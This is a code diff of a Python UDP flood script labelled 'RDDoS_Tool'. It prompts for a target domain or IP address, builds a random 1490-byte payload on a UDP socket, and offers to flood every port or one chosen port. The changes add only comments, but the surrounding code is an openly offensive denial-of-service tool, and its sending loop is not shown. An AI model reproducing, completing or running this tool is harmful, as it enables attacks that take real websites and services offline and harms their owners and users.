@@ -1,3 +1,4 @@
+# Import.
 from   platform import system
 from   tqdm.auto import tqdm
 import os
@@ -6,10 +7,12 @@ import random
 import socket
 import pyfiglet
 
+
+# Version.
 version = "1.2"
 
 
-#platform info
+# Platform info
 uname=system()
 
 if uname == "Windows":
@@ -20,13 +23,14 @@ else:
 os.system(cmd_clear)
 
 
-##############
+# Socket
 sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
-#############
 
 
+# RDDoS_Tool
 while True:
+    # UI.
     print("\033[91m   _____ \033[0m         \033[95m  ______    ______         __ \033[0m     ______)        Version: " + version)       
     print("\033[91m  (, /   )      /)\033[0m \033[95m(, /    ) (, /    )   (__/  )\033[0m    (, /        /)") 
     print("\033[91m    /__ /  _  _(/\033[0m  \033[95m  /    /    /    / ___  /     \033[0m     /  ______// ")
@@ -39,8 +43,10 @@ while True:
     print("1. Website Domain\n2. IP Address\n3. About\n4. Exit")
     print('\033[0m')
 
+    # Input.
     opt = str(input("\n> "))
 
+    # Selection.
     if opt == '1':
         domain = str(input("Domain:"))
         ip = socket.gethostbyname(domain)
@@ -77,6 +83,7 @@ while True:
         time.sleep(2)
         os.system(cmd_clear)
 
+# Port selection.
 port_mode = False # If 'False' all ports will be use, if 'True' - certain.
 port = 2
 
@@ -95,6 +102,7 @@ while 1:
         print('\033[91mInvaild Choice!\033[0m')
         time.sleep(2)
 
+# Starting working.
 os.system(cmd_clear)
 print('\033[36;2mINITIALIZING....')
 time.sleep(1)
@@ -122,6 +130,7 @@ if port_mode == False:  # All ports.
 elif port_mode == True: # Certain port.
     if port < 2:
         port = 2
+        
     elif port == 65534:
         port = 2
 
